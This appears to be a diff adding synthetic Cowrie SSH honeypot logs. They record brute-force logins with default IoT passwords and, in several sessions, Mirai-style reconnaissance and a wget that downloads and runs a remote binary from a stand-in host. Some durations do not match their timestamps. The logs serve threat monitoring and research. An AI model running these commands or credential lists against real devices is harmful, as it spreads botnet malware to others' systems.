+{"eventid":"cowrie.login.failed","session":"0399eb28e3b1","src_ip":"192.0.2.15","timestamp":"2026-08-13T09:20:02.000Z","sensor":"honeypot","username":"admin","password":"password"}
+{"eventid":"cowrie.session.closed","session":"0399eb28e3b1","src_ip":"192.0.2.15","timestamp":"2026-08-13T09:20:00.000Z","sensor":"honeypot","duration":34.39}
+{"eventid":"cowrie.session.connect","session":"1b71caae117e","src_ip":"198.51.100.23","timestamp":"2026-08-13T12:52:46.000Z","sensor":"honeypot","src_port":25540,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"1b71caae117e","src_ip":"198.51.100.23","timestamp":"2026-08-13T12:52:46.120Z","sensor":"honeypot","version":"SSH-2.0-PUTTY"}
+{"eventid":"cowrie.login.failed","session":"1b71caae117e","src_ip":"198.51.100.23","timestamp":"2026-08-13T12:52:47.000Z","sensor":"honeypot","username":"root","password":""}
+{"eventid":"cowrie.login.failed","session":"1b71caae117e","src_ip":"198.51.100.23","timestamp":"2026-08-13T12:52:48.000Z","sensor":"honeypot","username":"admin","password":"1234"}
+{"eventid":"cowrie.login.failed","session":"1b71caae117e","src_ip":"198.51.100.23","timestamp":"2026-08-13T12:52:49.000Z","sensor":"honeypot","username":"root","password":"juantech"}
+{"eventid":"cowrie.login.success","session":"1b71caae117e","src_ip":"198.51.100.23","timestamp":"2026-08-13T12:52:50.000Z","sensor":"honeypot","username":"root","password":"root"}
+{"eventid":"cowrie.login.failed","session":"1b71caae117e","src_ip":"198.51.100.23","timestamp":"2026-08-13T12:52:51.000Z","sensor":"honeypot","username":"root","password":"xc3511"}
+{"eventid":"cowrie.command.input","session":"1b71caae117e","src_ip":"198.51.100.23","timestamp":"2026-08-13T12:52:53.000Z","sensor":"honeypot","input":"/bin/busybox MIRAI"}
+{"eventid":"cowrie.command.input","session":"1b71caae117e","src_ip":"198.51.100.23","timestamp":"2026-08-13T12:52:55.000Z","sensor":"honeypot","input":"uname -a"}
+{"eventid":"cowrie.command.input","session":"1b71caae117e","src_ip":"198.51.100.23","timestamp":"2026-08-13T12:52:56.000Z","sensor":"honeypot","input":"cat /proc/cpuinfo | grep name | head -n 1"}
+{"eventid":"cowrie.command.input","session":"1b71caae117e","src_ip":"198.51.100.23","timestamp":"2026-08-13T12:53:00.000Z","sensor":"honeypot","input":"cat /proc/mounts"}
+{"eventid":"cowrie.command.input","session":"1b71caae117e","src_ip":"198.51.100.23","timestamp":"2026-08-13T12:53:02.000Z","sensor":"honeypot","input":"free -m"}
+{"eventid":"cowrie.command.input","session":"1b71caae117e","src_ip":"198.51.100.23","timestamp":"2026-08-13T12:53:03.000Z","sensor":"honeypot","input":"wget http://198.51.100.250/bins/mirai.x86 -O /tmp/.x"}
+{"eventid":"cowrie.session.file_download","session":"1b71caae117e","src_ip":"198.51.100.23","timestamp":"2026-08-13T12:53:03.800Z","sensor":"honeypot","url":"http://198.51.100.250/bins/mirai.x86","outfile":"var/lib/cowrie/downloads/3b1c6f2e9a7d4b8c1e5f0a2d6c9b3e7f4a1d8c2b5e0f9a6d3c7b1e4f8a2d5c0b9","shasum":"3b1c6f2e9a7d4b8c1e5f0a2d6c9b3e7f4a1d8c2b5e0f9a6d3c7b1e4f8a2d5c0b9"}
+{"eventid":"cowrie.command.input","session":"1b71caae117e","src_ip":"198.51.100.23","timestamp":"2026-08-13T12:53:07.000Z","sensor":"honeypot","input":"chmod +x /tmp/.x"}
+{"eventid":"cowrie.command.input","session":"1b71caae117e","src_ip":"198.51.100.23","timestamp":"2026-08-13T12:53:09.000Z","sensor":"honeypot","input":"/tmp/.x"}
+{"eventid":"cowrie.command.input","session":"1b71caae117e","src_ip":"198.51.100.23","timestamp":"2026-08-13T12:53:10.000Z","sensor":"honeypot","input":"rm -rf /tmp/.x"}
+{"eventid":"cowrie.session.closed","session":"1b71caae117e","src_ip":"198.51.100.23","timestamp":"2026-08-13T12:53:26.000Z","sensor":"honeypot","duration":23.31}
+{"eventid":"cowrie.session.connect","session":"d9ab05370ee5","src_ip":"198.51.100.140","timestamp":"2026-08-13T15:09:44.000Z","sensor":"honeypot","src_port":50593,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"d9ab05370ee5","src_ip":"198.51.100.140","timestamp":"2026-08-13T15:09:44.120Z","sensor":"honeypot","version":"SSH-2.0-Go"}
+{"eventid":"cowrie.login.failed","session":"d9ab05370ee5","src_ip":"198.51.100.140","timestamp":"2026-08-13T15:09:45.000Z","sensor":"honeypot","username":"pi","password":"raspberry"}
+{"eventid":"cowrie.session.closed","session":"d9ab05370ee5","src_ip":"198.51.100.140","timestamp":"2026-08-13T15:10:06.000Z","sensor":"honeypot","duration":13.75}
+{"eventid":"cowrie.session.connect","session":"a6c8fee7d9fd","src_ip":"203.0.113.201","timestamp":"2026-08-13T15:19:33.000Z","sensor":"honeypot","src_port":24668,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"a6c8fee7d9fd","src_ip":"203.0.113.201","timestamp":"2026-08-13T15:19:33.120Z","sensor":"honeypot","version":"SSH-2.0-paramiko_2.7.2"}
+{"eventid":"cowrie.login.failed","session":"a6c8fee7d9fd","src_ip":"203.0.113.201","timestamp":"2026-08-13T15:19:34.000Z","sensor":"honeypot","username":"admin","password":"password"}
+{"eventid":"cowrie.login.failed","session":"a6c8fee7d9fd","src_ip":"203.0.113.201","timestamp":"2026-08-13T15:19:35.000Z","sensor":"honeypot","username":"pi","password":"raspberry"}
+{"eventid":"cowrie.login.failed","session":"a6c8fee7d9fd","src_ip":"203.0.113.201","timestamp":"2026-08-13T15:19:36.000Z","sensor":"honeypot","username":"root","password":"123456"}
+{"eventid":"cowrie.login.success","session":"a6c8fee7d9fd","src_ip":"203.0.113.201","timestamp":"2026-08-13T15:19:37.000Z","sensor":"honeypot","username":"admin","password":"admin"}
+{"eventid":"cowrie.login.failed","session":"a6c8fee7d9fd","src_ip":"203.0.113.201","timestamp":"2026-08-13T15:19:38.000Z","sensor":"honeypot","username":"admin","password":"smcadmin"}
+{"eventid":"cowrie.command.input","session":"a6c8fee7d9fd","src_ip":"203.0.113.201","timestamp":"2026-08-13T15:19:42.000Z","sensor":"honeypot","input":"/bin/busybox MIRAI"}
+{"eventid":"cowrie.command.input","session":"a6c8fee7d9fd","src_ip":"203.0.113.201","timestamp":"2026-08-13T15:19:46.000Z","sensor":"honeypot","input":"uname -a"}
+{"eventid":"cowrie.command.input","session":"a6c8fee7d9fd","src_ip":"203.0.113.201","timestamp":"2026-08-13T15:19:47.000Z","sensor":"honeypot","input":"cat /proc/cpuinfo | grep name | head -n 1"}
+{"eventid":"cowrie.command.input","session":"a6c8fee7d9fd","src_ip":"203.0.113.201","timestamp":"2026-08-13T15:19:51.000Z","sensor":"honeypot","input":"cat /proc/mounts"}
+{"eventid":"cowrie.session.closed","session":"a6c8fee7d9fd","src_ip":"203.0.113.201","timestamp":"2026-08-13T15:19:53.000Z","sensor":"honeypot","duration":44.14}
+{"eventid":"cowrie.session.connect","session":"de38f84d63b7","src_ip":"198.51.100.23","timestamp":"2026-08-13T18:27:20.000Z","sensor":"honeypot","src_port":6423,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"de38f84d63b7","src_ip":"198.51.100.23","timestamp":"2026-08-13T18:27:20.120Z","sensor":"honeypot","version":"SSH-2.0-Go"}
+{"eventid":"cowrie.login.failed","session":"de38f84d63b7","src_ip":"198.51.100.23","timestamp":"2026-08-13T18:27:21.000Z","sensor":"honeypot","username":"root","password":"1111"}
+{"eventid":"cowrie.login.failed","session":"de38f84d63b7","src_ip":"198.51.100.23","timestamp":"2026-08-13T18:27:22.000Z","sensor":"honeypot","username":"Administrator","password":"admin"}
+{"eventid":"cowrie.login.failed","session":"de38f84d63b7","src_ip":"198.51.100.23","timestamp":"2026-08-13T18:27:23.000Z","sensor":"honeypot","username":"user","password":"user"}
+{"eventid":"cowrie.login.failed","session":"de38f84d63b7","src_ip":"198.51.100.23","timestamp":"2026-08-13T18:27:24.000Z","sensor":"honeypot","username":"admin","password":"smcadmin"}
+{"eventid":"cowrie.login.failed","session":"de38f84d63b7","src_ip":"198.51.100.23","timestamp":"2026-08-13T18:27:25.000Z","sensor":"honeypot","username":"root","password":"123456"}
+{"eventid":"cowrie.session.closed","session":"de38f84d63b7","src_ip":"198.51.100.23","timestamp":"2026-08-13T18:27:27.000Z","sensor":"honeypot","duration":21.48}
+{"eventid":"cowrie.session.connect","session":"be5abed86e62","src_ip":"192.0.2.200","timestamp":"2026-08-13T18:38:29.000Z","sensor":"honeypot","src_port":10602,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"be5abed86e62","src_ip":"192.0.2.200","timestamp":"2026-08-13T18:38:29.120Z","sensor":"honeypot","version":"SSH-2.0-libssh2_1.9.0"}
+{"eventid":"cowrie.login.failed","session":"be5abed86e62","src_ip":"192.0.2.200","timestamp":"2026-08-13T18:38:30.000Z","sensor":"honeypot","username":"Administrator","password":"admin"}
+{"eventid":"cowrie.login.failed","session":"be5abed86e62","src_ip":"192.0.2.200","timestamp":"2026-08-13T18:38:31.000Z","sensor":"honeypot","username":"root","password":""}
+{"eventid":"cowrie.session.closed","session":"be5abed86e62","src_ip":"192.0.2.200","timestamp":"2026-08-13T18:38:41.000Z","sensor":"honeypot","duration":7.41}
+{"eventid":"cowrie.session.connect","session":"f7f662ec9678","src_ip":"192.0.2.15","timestamp":"2026-08-13T20:07:33.000Z","sensor":"honeypot","src_port":25493,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"f7f662ec9678","src_ip":"192.0.2.15","timestamp":"2026-08-13T20:07:33.120Z","sensor":"honeypot","version":"SSH-2.0-paramiko_2.7.2"}
+{"eventid":"cowrie.login.success","session":"f7f662ec9678","src_ip":"192.0.2.15","timestamp":"2026-08-13T20:07:34.000Z","sensor":"honeypot","username":"root","password":"root"}
+{"eventid":"cowrie.login.failed","session":"f7f662ec9678","src_ip":"192.0.2.15","timestamp":"2026-08-13T20:07:35.000Z","sensor":"honeypot","username":"Administrator","password":"admin"}
+{"eventid":"cowrie.session.closed","session":"f7f662ec9678","src_ip":"192.0.2.15","timestamp":"2026-08-13T20:07:52.000Z","sensor":"honeypot","duration":36.49}
+{"eventid":"cowrie.session.connect","session":"f7ff47ef37c6","src_ip":"198.51.100.87","timestamp":"2026-08-13T21:15:42.000Z","sensor":"honeypot","src_port":48959,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"f7ff47ef37c6","src_ip":"198.51.100.87","timestamp":"2026-08-13T21:15:42.120Z","sensor":"honeypot","version":"SSH-2.0-libssh2_1.9.0"}
+{"eventid":"cowrie.login.failed","session":"f7ff47ef37c6","src_ip":"198.51.100.87","timestamp":"2026-08-13T21:15:43.000Z","sensor":"honeypot","username":"root","password":"888888"}
+{"eventid":"cowrie.login.failed","session":"f7ff47ef37c6","src_ip":"198.51.100.87","timestamp":"2026-08-13T21:15:44.000Z","sensor":"honeypot","username":"pi","password":"raspberry"}
+{"eventid":"cowrie.session.closed","session":"f7ff47ef37c6","src_ip":"198.51.100.87","timestamp":"2026-08-13T21:15:54.000Z","sensor":"honeypot","duration":8.11}
+{"eventid":"cowrie.session.connect","session":"797a0e3c3648","src_ip":"198.51.100.23","timestamp":"2026-08-14T00:40:04.000Z","sensor":"honeypot","src_port":9127,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"797a0e3c3648","src_ip":"198.51.100.23","timestamp":"2026-08-14T00:40:04.120Z","sensor":"honeypot","version":"SSH-2.0-Go"}
+{"eventid":"cowrie.login.failed","session":"797a0e3c3648","src_ip":"198.51.100.23","timestamp":"2026-08-14T00:40:05.000Z","sensor":"honeypot","username":"root","password":"1234"}
+{"eventid":"cowrie.login.success","session":"797a0e3c3648","src_ip":"198.51.100.23","timestamp":"2026-08-14T00:40:06.000Z","sensor":"honeypot","username":"root","password":"admin"}
+{"eventid":"cowrie.command.input","session":"797a0e3c3648","src_ip":"198.51.100.23","timestamp":"2026-08-14T00:40:13.000Z","sensor":"honeypot","input":"/bin/busybox MIRAI"}
+{"eventid":"cowrie.command.input","session":"797a0e3c3648","src_ip":"198.51.100.23","timestamp":"2026-08-14T00:40:17.000Z","sensor":"honeypot","input":"uname -a"}
+{"eventid":"cowrie.command.input","session":"797a0e3c3648","src_ip":"198.51.100.23","timestamp":"2026-08-14T00:40:18.000Z","sensor":"honeypot","input":"cat /proc/cpuinfo | grep name | head -n 1"}
+{"eventid":"cowrie.command.input","session":"797a0e3c3648","src_ip":"198.51.100.23","timestamp":"2026-08-14T00:40:20.000Z","sensor":"honeypot","input":"cat /proc/mounts"}
+{"eventid":"cowrie.command.input","session":"797a0e3c3648","src_ip":"198.51.100.23","timestamp":"2026-08-14T00:40:22.000Z","sensor":"honeypot","input":"free -m"}
+{"eventid":"cowrie.command.input","session":"797a0e3c3648","src_ip":"198.51.100.23","timestamp":"2026-08-14T00:40:25.000Z","sensor":"honeypot","input":"wget http://198.51.100.250/bins/mirai.x86 -O /tmp/.x"}
+{"eventid":"cowrie.session.file_download","session":"797a0e3c3648","src_ip":"198.51.100.23","timestamp":"2026-08-14T00:40:25.800Z","sensor":"honeypot","url":"http://198.51.100.250/bins/mirai.x86","outfile":"var/lib/cowrie/downloads/3b1c6f2e9a7d4b8c1e5f0a2d6c9b3e7f4a1d8c2b5e0f9a6d3c7b1e4f8a2d5c0b9","shasum":"3b1c6f2e9a7d4b8c1e5f0a2d6c9b3e7f4a1d8c2b5e0f9a6d3c7b1e4f8a2d5c0b9"}
+{"eventid":"cowrie.command.input","session":"797a0e3c3648","src_ip":"198.51.100.23","timestamp":"2026-08-14T00:40:26.000Z","sensor":"honeypot","input":"chmod +x /tmp/.x"}
+{"eventid":"cowrie.session.closed","session":"797a0e3c3648","src_ip":"198.51.100.23","timestamp":"2026-08-14T00:40:43.000Z","sensor":"honeypot","duration":5.87}
+{"eventid":"cowrie.session.connect","session":"929d5122540c","src_ip":"192.0.2.77","timestamp":"2026-08-14T02:06:22.000Z","sensor":"honeypot","src_port":20085,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"929d5122540c","src_ip":"192.0.2.77","timestamp":"2026-08-14T02:06:22.120Z","sensor":"honeypot","version":"SSH-2.0-libssh2_1.9.0"}
+{"eventid":"cowrie.login.failed","session":"929d5122540c","src_ip":"192.0.2.77","timestamp":"2026-08-14T02:06:23.000Z","sensor":"honeypot","username":"root","password":""}
+{"eventid":"cowrie.login.failed","session":"929d5122540c","src_ip":"192.0.2.77","timestamp":"2026-08-14T02:06:24.000Z","sensor":"honeypot","username":"admin","password":"password"}
+{"eventid":"cowrie.login.failed","session":"929d5122540c","src_ip":"192.0.2.77","timestamp":"2026-08-14T02:06:25.000Z","sensor":"honeypot","username":"pi","password":"raspberry"}
+{"eventid":"cowrie.session.closed","session":"929d5122540c","src_ip":"192.0.2.77","timestamp":"2026-08-14T02:06:29.000Z","sensor":"honeypot","duration":29.44}
+{"eventid":"cowrie.session.connect","session":"11ae46868f5c","src_ip":"192.0.2.77","timestamp":"2026-08-14T03:32:18.000Z","sensor":"honeypot","src_port":55605,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"11ae46868f5c","src_ip":"192.0.2.77","timestamp":"2026-08-14T03:32:18.120Z","sensor":"honeypot","version":"SSH-2.0-libssh2_1.9.0"}
+{"eventid":"cowrie.login.failed","session":"11ae46868f5c","src_ip":"192.0.2.77","timestamp":"2026-08-14T03:32:19.000Z","sensor":"honeypot","username":"root","password":""}
+{"eventid":"cowrie.login.failed","session":"11ae46868f5c","src_ip":"192.0.2.77","timestamp":"2026-08-14T03:32:20.000Z","sensor":"honeypot","username":"root","password":"juantech"}
+{"eventid":"cowrie.session.closed","session":"11ae46868f5c","src_ip":"192.0.2.77","timestamp":"2026-08-14T03:32:51.000Z","sensor":"honeypot","duration":29.49}
+{"eventid":"cowrie.session.connect","session":"e1420561ef6e","src_ip":"192.0.2.200","timestamp":"2026-08-14T03:53:55.000Z","sensor":"honeypot","src_port":13449,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"e1420561ef6e","src_ip":"192.0.2.200","timestamp":"2026-08-14T03:53:55.120Z","sensor":"honeypot","version":"SSH-2.0-paramiko_2.7.2"}
+{"eventid":"cowrie.login.failed","session":"e1420561ef6e","src_ip":"192.0.2.200","timestamp":"2026-08-14T03:53:56.000Z","sensor":"honeypot","username":"root","password":"default"}
+{"eventid":"cowrie.login.failed","session":"e1420561ef6e","src_ip":"192.0.2.200","timestamp":"2026-08-14T03:53:57.000Z","sensor":"honeypot","username":"root","password":"12345"}
+{"eventid":"cowrie.login.failed","session":"e1420561ef6e","src_ip":"192.0.2.200","timestamp":"2026-08-14T03:53:58.000Z","sensor":"honeypot","username":"root","password":"123456"}
+{"eventid":"cowrie.login.failed","session":"e1420561ef6e","src_ip":"192.0.2.200","timestamp":"2026-08-14T03:53:59.000Z","sensor":"honeypot","username":"root","password":"1111"}
+{"eventid":"cowrie.session.closed","session":"e1420561ef6e","src_ip":"192.0.2.200","timestamp":"2026-08-14T03:54:28.000Z","sensor":"honeypot","duration":30.92}
+{"eventid":"cowrie.session.connect","session":"e7e3900a5085","src_ip":"198.51.100.140","timestamp":"2026-08-14T07:00:32.000Z","sensor":"honeypot","src_port":9393,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"e7e3900a5085","src_ip":"198.51.100.140","timestamp":"2026-08-14T07:00:32.120Z","sensor":"honeypot","version":"SSH-2.0-PUTTY"}
+{"eventid":"cowrie.login.failed","session":"e7e3900a5085","src_ip":"198.51.100.140","timestamp":"2026-08-14T07:00:33.000Z","sensor":"honeypot","username":"root","password":"default"}
+{"eventid":"cowrie.login.failed","session":"e7e3900a5085","src_ip":"198.51.100.140","timestamp":"2026-08-14T07:00:34.000Z","sensor":"honeypot","username":"admin","password":"1234"}
+{"eventid":"cowrie.login.success","session":"e7e3900a5085","src_ip":"198.51.100.140","timestamp":"2026-08-14T07:00:35.000Z","sensor":"honeypot","username":"root","password":"root"}
+{"eventid":"cowrie.login.failed","session":"e7e3900a5085","src_ip":"198.51.100.140","timestamp":"2026-08-14T07:00:36.000Z","sensor":"honeypot","username":"root","password":"admin"}
+{"eventid":"cowrie.command.input","session":"e7e3900a5085","src_ip":"198.51.100.140","timestamp":"2026-08-14T07:00:40.000Z","sensor":"honeypot","input":"/bin/busybox MIRAI"}
+{"eventid":"cowrie.command.input","session":"e7e3900a5085","src_ip":"198.51.100.140","timestamp":"2026-08-14T07:00:43.000Z","sensor":"honeypot","input":"uname -a"}
+{"eventid":"cowrie.command.input","session":"e7e3900a5085","src_ip":"198.51.100.140","timestamp":"2026-08-14T07:00:46.000Z","sensor":"honeypot","input":"cat /proc/cpuinfo | grep name | head -n 1"}
+{"eventid":"cowrie.command.input","session":"e7e3900a5085","src_ip":"198.51.100.140","timestamp":"2026-08-14T07:00:47.000Z","sensor":"honeypot","input":"cat /proc/mounts"}
+{"eventid":"cowrie.command.input","session":"e7e3900a5085","src_ip":"198.51.100.140","timestamp":"2026-08-14T07:00:48.000Z","sensor":"honeypot","input":"free -m"}
+{"eventid":"cowrie.session.closed","session":"e7e3900a5085","src_ip":"198.51.100.140","timestamp":"2026-08-14T07:01:01.000Z","sensor":"honeypot","duration":7.19}
+{"eventid":"cowrie.session.connect","session":"9b1befb6fab4","src_ip":"198.51.100.140","timestamp":"2026-08-14T07:27:12.000Z","sensor":"honeypot","src_port":48620,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"9b1befb6fab4","src_ip":"198.51.100.140","timestamp":"2026-08-14T07:27:12.120Z","sensor":"honeypot","version":"SSH-2.0-PUTTY"}
+{"eventid":"cowrie.login.failed","session":"9b1befb6fab4","src_ip":"198.51.100.140","timestamp":"2026-08-14T07:27:13.000Z","sensor":"honeypot","username":"root","password":"1111"}
+{"eventid":"cowrie.login.failed","session":"9b1befb6fab4","src_ip":"198.51.100.140","timestamp":"2026-08-14T07:27:14.000Z","sensor":"honeypot","username":"user","password":"user"}
+{"eventid":"cowrie.login.failed","session":"9b1befb6fab4","src_ip":"198.51.100.140","timestamp":"2026-08-14T07:27:15.000Z","sensor":"honeypot","username":"root","password":"xc3511"}
+{"eventid":"cowrie.login.success","session":"9b1befb6fab4","src_ip":"198.51.100.140","timestamp":"2026-08-14T07:27:16.000Z","sensor":"honeypot","username":"admin","password":"admin"}
+{"eventid":"cowrie.login.failed","session":"9b1befb6fab4","src_ip":"198.51.100.140","timestamp":"2026-08-14T07:27:17.000Z","sensor":"honeypot","username":"root","password":"vizxv"}
+{"eventid":"cowrie.session.closed","session":"9b1befb6fab4","src_ip":"198.51.100.140","timestamp":"2026-08-14T07:27:29.000Z","sensor":"honeypot","duration":35.17}
+{"eventid":"cowrie.session.connect","session":"22b6b3484b07","src_ip":"203.0.113.44","timestamp":"2026-08-14T10:31:13.000Z","sensor":"honeypot","src_port":49210,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"22b6b3484b07","src_ip":"203.0.113.44","timestamp":"2026-08-14T10:31:13.120Z","sensor":"honeypot","version":"SSH-2.0-libssh2_1.9.0"}
+{"eventid":"cowrie.login.failed","session":"22b6b3484b07","src_ip":"203.0.113.44","timestamp":"2026-08-14T10:31:14.000Z","sensor":"honeypot","username":"root","password":"vizxv"}
+{"eventid":"cowrie.login.failed","session":"22b6b3484b07","src_ip":"203.0.113.44","timestamp":"2026-08-14T10:31:15.000Z","sensor":"honeypot","username":"root","password":"klv123"}
+{"eventid":"cowrie.login.failed","session":"22b6b3484b07","src_ip":"203.0.113.44","timestamp":"2026-08-14T10:31:16.000Z","sensor":"honeypot","username":"root","password":"1111"}
+{"eventid":"cowrie.login.failed","session":"22b6b3484b07","src_ip":"203.0.113.44","timestamp":"2026-08-14T10:31:17.000Z","sensor":"honeypot","username":"Administrator","password":"admin"}
+{"eventid":"cowrie.login.failed","session":"22b6b3484b07","src_ip":"203.0.113.44","timestamp":"2026-08-14T10:31:18.000Z","sensor":"honeypot","username":"root","password":"xc3511"}
+{"eventid":"cowrie.session.closed","session":"22b6b3484b07","src_ip":"203.0.113.44","timestamp":"2026-08-14T10:31:51.000Z","sensor":"honeypot","duration":31.74}
+{"eventid":"cowrie.session.connect","session":"4ef9c65c5adb","src_ip":"192.0.2.200","timestamp":"2026-08-14T13:12:05.000Z","sensor":"honeypot","src_port":23527,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"4ef9c65c5adb","src_ip":"192.0.2.200","timestamp":"2026-08-14T13:12:05.120Z","sensor":"honeypot","version":"SSH-2.0-libssh2_1.10.0"}
+{"eventid":"cowrie.login.failed","session":"4ef9c65c5adb","src_ip":"192.0.2.200","timestamp":"2026-08-14T13:12:06.000Z","sensor":"honeypot","username":"Administrator","password":"admin"}
+{"eventid":"cowrie.login.failed","session":"4ef9c65c5adb","src_ip":"192.0.2.200","timestamp":"2026-08-14T13:12:07.000Z","sensor":"honeypot","username":"pi","password":"raspberry"}
+{"eventid":"cowrie.login.failed","session":"4ef9c65c5adb","src_ip":"192.0.2.200","timestamp":"2026-08-14T13:12:08.000Z","sensor":"honeypot","username":"root","password":"12345"}
+{"eventid":"cowrie.session.closed","session":"4ef9c65c5adb","src_ip":"192.0.2.200","timestamp":"2026-08-14T13:12:28.000Z","sensor":"honeypot","duration":41.41}
+{"eventid":"cowrie.session.connect","session":"103a2dd62102","src_ip":"198.51.100.140","timestamp":"2026-08-14T15:31:44.000Z","sensor":"honeypot","src_port":65496,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"103a2dd62102","src_ip":"198.51.100.140","timestamp":"2026-08-14T15:31:44.120Z","sensor":"honeypot","version":"SSH-2.0-PUTTY"}
+{"eventid":"cowrie.login.failed","session":"103a2dd62102","src_ip":"198.51.100.140","timestamp":"2026-08-14T15:31:45.000Z","sensor":"honeypot","username":"root","password":""}
+{"eventid":"cowrie.session.closed","session":"103a2dd62102","src_ip":"198.51.100.140","timestamp":"2026-08-14T15:32:13.000Z","sensor":"honeypot","duration":18.87}
+{"eventid":"cowrie.session.connect","session":"7798126dfd0c","src_ip":"203.0.113.201","timestamp":"2026-08-14T15:36:29.000Z","sensor":"honeypot","src_port":48110,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"7798126dfd0c","src_ip":"203.0.113.201","timestamp":"2026-08-14T15:36:29.120Z","sensor":"honeypot","version":"SSH-2.0-paramiko_2.7.2"}
+{"eventid":"cowrie.login.failed","session":"7798126dfd0c","src_ip":"203.0.113.201","timestamp":"2026-08-14T15:36:30.000Z","sensor":"honeypot","username":"admin","password":"1234"}
+{"eventid":"cowrie.login.failed","session":"7798126dfd0c","src_ip":"203.0.113.201","timestamp":"2026-08-14T15:36:31.000Z","sensor":"honeypot","username":"support","password":"support"}
+{"eventid":"cowrie.session.closed","session":"7798126dfd0c","src_ip":"203.0.113.201","timestamp":"2026-08-14T15:37:09.000Z","sensor":"honeypot","duration":27.09}
+{"eventid":"cowrie.session.connect","session":"5a877381c9b7","src_ip":"192.0.2.15","timestamp":"2026-08-14T15:56:29.000Z","sensor":"honeypot","src_port":36114,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"5a877381c9b7","src_ip":"192.0.2.15","timestamp":"2026-08-14T15:56:29.120Z","sensor":"honeypot","version":"SSH-2.0-Go"}
+{"eventid":"cowrie.login.failed","session":"5a877381c9b7","src_ip":"192.0.2.15","timestamp":"2026-08-14T15:56:30.000Z","sensor":"honeypot","username":"user","password":"user"}
+{"eventid":"cowrie.login.failed","session":"5a877381c9b7","src_ip":"192.0.2.15","timestamp":"2026-08-14T15:56:31.000Z","sensor":"honeypot","username":"root","password":"xc3511"}
+{"eventid":"cowrie.login.failed","session":"5a877381c9b7","src_ip":"192.0.2.15","timestamp":"2026-08-14T15:56:32.000Z","sensor":"honeypot","username":"ubnt","password":"ubnt"}
+{"eventid":"cowrie.session.closed","session":"5a877381c9b7","src_ip":"192.0.2.15","timestamp":"2026-08-14T15:56:49.000Z","sensor":"honeypot","duration":26.22}
+{"eventid":"cowrie.session.connect","session":"c9627a378b6c","src_ip":"192.0.2.77","timestamp":"2026-08-14T16:27:51.000Z","sensor":"honeypot","src_port":4260,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"c9627a378b6c","src_ip":"192.0.2.77","timestamp":"2026-08-14T16:27:51.120Z","sensor":"honeypot","version":"SSH-2.0-libssh2_1.9.0"}
+{"eventid":"cowrie.login.failed","session":"c9627a378b6c","src_ip":"192.0.2.77","timestamp":"2026-08-14T16:27:52.000Z","sensor":"honeypot","username":"root","password":"1111"}
+{"eventid":"cowrie.login.failed","session":"c9627a378b6c","src_ip":"192.0.2.77","timestamp":"2026-08-14T16:27:53.000Z","sensor":"honeypot","username":"Administrator","password":"admin"}
+{"eventid":"cowrie.session.closed","session":"c9627a378b6c","src_ip":"192.0.2.77","timestamp":"2026-08-14T16:28:09.000Z","sensor":"honeypot","duration":26.75}
+{"eventid":"cowrie.session.connect","session":"e07fd6e34a3a","src_ip":"192.0.2.15","timestamp":"2026-08-14T17:18:24.000Z","sensor":"honeypot","src_port":45630,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"e07fd6e34a3a","src_ip":"192.0.2.15","timestamp":"2026-08-14T17:18:24.120Z","sensor":"honeypot","version":"SSH-2.0-libssh2_1.9.0"}
+{"eventid":"cowrie.login.failed","session":"e07fd6e34a3a","src_ip":"192.0.2.15","timestamp":"2026-08-14T17:18:25.000Z","sensor":"honeypot","username":"root","password":"default"}
+{"eventid":"cowrie.login.failed","session":"e07fd6e34a3a","src_ip":"192.0.2.15","timestamp":"2026-08-14T17:18:26.000Z","sensor":"honeypot","username":"admin","password":"password"}
+{"eventid":"cowrie.login.failed","session":"e07fd6e34a3a","src_ip":"192.0.2.15","timestamp":"2026-08-14T17:18:27.000Z","sensor":"honeypot","username":"root","password":"1234"}
+{"eventid":"cowrie.login.failed","session":"e07fd6e34a3a","src_ip":"192.0.2.15","timestamp":"2026-08-14T17:18:28.000Z","sensor":"honeypot","username":"user","password":"user"}
+{"eventid":"cowrie.login.failed","session":"e07fd6e34a3a","src_ip":"192.0.2.15","timestamp":"2026-08-14T17:18:29.000Z","sensor":"honeypot","username":"admin","password":"1234"}
+{"eventid":"cowrie.login.failed","session":"e07fd6e34a3a","src_ip":"192.0.2.15","timestamp":"2026-08-14T17:18:30.000Z","sensor":"honeypot","username":"admin","password":"smcadmin"}
+{"eventid":"cowrie.session.closed","session":"e07fd6e34a3a","src_ip":"192.0.2.15","timestamp":"2026-08-14T17:19:03.000Z","sensor":"honeypot","duration":3.05}
+{"eventid":"cowrie.session.connect","session":"f70ded45d58e","src_ip":"203.0.113.44","timestamp":"2026-08-14T20:04:10.000Z","sensor":"honeypot","src_port":36599,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"f70ded45d58e","src_ip":"203.0.113.44","timestamp":"2026-08-14T20:04:10.120Z","sensor":"honeypot","version":"SSH-2.0-libssh2_1.10.0"}
+{"eventid":"cowrie.login.failed","session":"f70ded45d58e","src_ip":"203.0.113.44","timestamp":"2026-08-14T20:04:11.000Z","sensor":"honeypot","username":"root","password":"default"}
